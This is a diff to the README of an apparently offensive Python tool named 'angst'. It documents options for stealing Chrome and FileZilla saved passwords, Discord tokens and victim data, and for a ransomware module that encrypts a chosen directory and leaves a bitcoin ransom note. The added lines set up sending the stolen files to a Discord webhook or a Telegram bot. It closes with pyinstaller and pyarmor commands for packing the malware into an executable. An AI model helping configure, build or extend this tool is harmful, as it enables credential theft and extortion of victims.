@@ -45,6 +45,10 @@ chrome -> If it should include chrome passwords </br>
 filezilla -> Should it include possible saved filezilla passwords</br>
 userdata -> Give information about your victim </br>
 discord -> Steal discord tokens</br>
+send_discord -> Option to send to Discord Webhook<br>
+send_telegram -> Option to send to a Telegram Channel<br>
+telegram_token -> Token for Telegram Bot that sends files<br>
+telegram_chat_id -> The Chat ID for where you want the bot to send these files<br>
 ransomware -> If enabled is set to `True` then have enabled the ransomware module. The target_dir is the directory in which you want it to encrypt. The ransomware extenstion setting just sets the output file extenstion, in this case its just `.angst`. The btcAddy and email are just options which you can toss in to be included in the ransomware note. (INCOMPLETE).</br>
 6. Run one of the following commands listed below, it is worth noting that pyarmor will sometimes corrupt the executable so if you plan on using the pyarmor command you should test it locally to make sure it works.</br>
 `PYINSTALLER: pyinstaller --onefile --hidden-import=pkg_resources.py2_warn angst.py`</br>
